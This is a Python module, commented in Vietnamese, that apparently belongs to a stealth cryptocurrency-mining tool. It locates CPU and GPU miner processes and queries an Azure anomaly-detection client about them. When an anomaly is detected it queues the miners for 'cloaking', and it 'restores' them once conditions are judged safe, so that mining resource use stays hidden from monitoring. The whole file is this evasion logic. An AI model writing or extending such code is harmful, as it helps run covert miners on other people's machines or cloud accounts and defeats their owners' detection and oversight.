# anomaly_detector.py

import psutil
import logging
import traceback
import asyncio
import pynvml
from asyncio import Event
from typing import List, Dict, Any
from contextvars import ContextVar




from .utils import MiningProcess
from .anomaly_evaluator import SafeRestoreEvaluator


from .auxiliary_modules.models import ConfigModel
from .auxiliary_modules.event_bus import EventBus
from .auxiliary_modules.interfaces import IResourceManager



###############################################################################
#   QUẢN LÝ NVML TOÀN CỤC CHO MODULE (KHÔNG CÒN GPUManager RIÊNG)            #
###############################################################################

_nvml_initialized = False

def initialize_nvml():
    """
    Khởi tạo pynvml nếu chưa khởi tạo.
    """
    global _nvml_initialized
    if not _nvml_initialized:
        pynvml.nvmlInit()
        _nvml_initialized = True

def is_nvml_initialized() -> bool:
    """Trả về True nếu pynvml đã khởi tạo."""
    return _nvml_initialized

###############################################################################
#            LỚP ĐÁNH GIÁ KHẢ NĂNG PHỤC HỒI: SafeRestoreEvaluator             #
###############################################################################

# Giả sử lớp SafeRestoreEvaluator được định nghĩa trong anomaly_evaluator.py
# (Bạn cần tạo module này tương ứng với logic SafeRestoreEvaluator)

###############################################################################
#                           LỚP CHÍNH: AnomalyDetector                        #
###############################################################################

class AnomalyDetector:
    """
    Lớp phát hiện bất thường cho tiến trình khai thác.
    Sử dụng event-driven thay vì polling liên tục.
    """

    _instance = None
    _instance_lock = asyncio.Lock()

    def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger, resource_manager: IResourceManager):
        if not hasattr(cls, '_instance') or cls._instance is None:
            cls._instance = super(AnomalyDetector, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger, resource_manager: IResourceManager):
        if getattr(self, '_initialized', False):
            return

        self._initialized = True
        self.config = config
        self.event_bus = event_bus
        self.logger = logger
        self.resource_manager = resource_manager

        self.stop_event = asyncio.Event()
        self.mining_processes = []
        self.mining_processes_lock = asyncio.Lock()
        self.safe_restore_evaluator = SafeRestoreEvaluator(config, logger, resource_manager)

        self.task_futures = []
        self.logger.info("AnomalyDetector đã được khởi tạo thành công.")

    async def start(self):
        """
        Khởi động AnomalyDetector.
        """
        self.logger.info("Đang khởi động AnomalyDetector...")

        # Kiểm tra trạng thái ResourceManager
        if not self.resource_manager:
            raise RuntimeError("ResourceManager chưa được thiết lập.")

        # Đảm bảo NVML đã khởi tạo
        if not is_nvml_initialized():
            initialize_nvml()
            self.logger.info("NVML đã được khởi tạo.")

        # Khởi động các coroutine cần thiết
        loop = asyncio.get_event_loop()
        self.task_futures.append(loop.create_task(self.anomaly_detection()))
        self.task_futures.append(loop.create_task(self.monitor_restoration()))

        # Phát hiện tiến trình khai thác ban đầu
        await self.discover_mining_processes_async()
        self.logger.info("AnomalyDetector đã khởi động thành công.")

    async def discover_mining_processes_async(self):
        """
        Tìm các tiến trình khai thác dựa trên config (CPU/GPU).
        """
        cpu_name = self.config.processes.get('CPU', '').lower()
        gpu_name = self.config.processes.get('GPU', '').lower()

        async with self.mining_processes_lock:
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if cpu_name in proc_name or gpu_name in proc_name:
                        priority = self.get_process_priority(proc.info['name'])
                        net_if = self.config.network_interface
                        mp = MiningProcess(proc.info['pid'], proc.info['name'], priority, net_if, self.logger)
                        mp.is_cloaked = False
                        self.mining_processes.append(mp)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue

            self.logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")

    def get_process_priority(self, process_name: str) -> int:
        """Lấy độ ưu tiên của tiến trình dựa trên config."""
        priority_map = self.config.process_priority_map
        val = priority_map.get(process_name.lower(), 1)
        if not isinstance(val, int):
            self.logger.warning(f"Độ ưu tiên của '{process_name}' không phải int => gán = 1.")
            return 1
        return val

    ##########################################################################
    #                           PHÁT HIỆN BẤT THƯỜNG                          #
    ##########################################################################

    async def anomaly_detection(self):
        """
        Coroutine chính để phát hiện bất thường.
        """
        detection_interval = self.config.monitoring_parameters.get("detection_interval_seconds", 3600)

        while not self.stop_event.is_set():
            try:
                await self.discover_mining_processes_async()
                async with self.mining_processes_lock:
                    tasks = [
                        self.evaluate_process_anomaly(proc, cloak_delay=5)
                        for proc in self.mining_processes
                    ]
                await asyncio.gather(*tasks)

            except asyncio.CancelledError:
                self.logger.info("Anomaly detection coroutine bị hủy.")
                break
            except Exception as e:
                self.logger.error(f"Lỗi trong anomaly_detection: {e}\n{traceback.format_exc()}")

            await asyncio.sleep(detection_interval)

    async def evaluate_process_anomaly(self, process: MiningProcess, cloak_delay: int):
        """Đánh giá một tiến trình, nếu phát hiện bất thường => enqueue cloaking."""
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại.")
                return

            if not self.resource_manager:
                return

            current_state = await self.resource_manager.collect_metrics(process)
            anomalies_detected = await self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
            if anomalies_detected:
                self.logger.warning(f"Phát hiện bất thường {process.name} (PID={process.pid}). Cloak sau {cloak_delay}s.")
                await asyncio.sleep(cloak_delay)
                await self.enqueue_cloaking(process)
                process.is_cloaked = True

        except Exception as e:
            self.logger.error(f"Lỗi evaluate_process_anomaly PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def enqueue_cloaking(self, process: MiningProcess):
        """Thêm tiến trình vào queue ResourceManager để cloak."""
        try:
            await self.resource_manager.enqueue_cloaking(process)
            self.logger.info(f"Đã enqueue cloaking cho {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def enqueue_restoration(self, process: MiningProcess):
        """Thêm tiến trình vào queue ResourceManager để khôi phục."""
        try:
            await self.resource_manager.enqueue_restoration(process)
            self.logger.info(f"Đã enqueue khôi phục cho {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue restore PID={process.pid}: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #                    GIÁM SÁT ĐIỀU KIỆN PHỤC HỒI TÀI NGUYÊN              #
    ##########################################################################

    async def monitor_restoration(self):
        """
        Coroutine để khôi phục tài nguyên cho các tiến trình đã bị cloak,
        nếu đạt điều kiện an toàn. 
        """
        interval = 60
        while not self.stop_event.is_set():
            try:
                async with self.mining_processes_lock:
                    cloaked = [p for p in self.mining_processes if getattr(p, 'is_cloaked', False)]

                if self.safe_restore_evaluator and cloaked:
                    tasks = [self.safe_restore_evaluator.is_safe_to_restore(p) for p in cloaked]
                    results = await asyncio.gather(*tasks)

                    for proc, safe in zip(cloaked, results):
                        if safe:
                            self.logger.info(f"Đủ điều kiện khôi phục cho PID={proc.pid}.")
                            await self.enqueue_restoration(proc)
                            proc.is_cloaked = False
                            self.logger.info(f"Đã khôi phục tài nguyên cho {proc.name} (PID={proc.pid}).")

            except Exception as e:
                self.logger.error(f"Lỗi monitor_restoration: {e}\n{traceback.format_exc()}")

            await asyncio.sleep(interval)

    async def stop(self):
        """
        Dừng AnomalyDetector.
        """
        self.logger.info("Đang dừng AnomalyDetector...")
        self.stop_event.set()

        for task in self.task_futures:
            task.cancel()

        # Thu thập kết quả của các coroutine đã bị hủy
        await asyncio.gather(*self.task_futures, return_exceptions=True)

        self.logger.info("AnomalyDetector đã dừng thành công.")
